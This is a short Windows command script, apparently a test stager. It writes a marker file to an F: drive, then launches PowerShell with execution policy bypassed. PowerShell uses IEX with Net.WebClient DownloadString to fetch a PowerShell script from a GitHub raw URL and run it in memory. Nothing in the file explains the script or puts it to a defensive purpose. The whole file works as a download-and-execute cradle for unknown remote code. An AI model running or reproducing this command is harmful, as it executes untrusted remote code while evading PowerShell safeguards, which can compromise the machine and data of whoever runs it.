echo nihao > f:\testok1.txt
powershell -ExecutionPolicy Bypass -NoLogo -NoProfile IEX (New-Object Net.WebClient).DownloadString('https://github.com/begiilm/dy/raw/master/test2.ps1')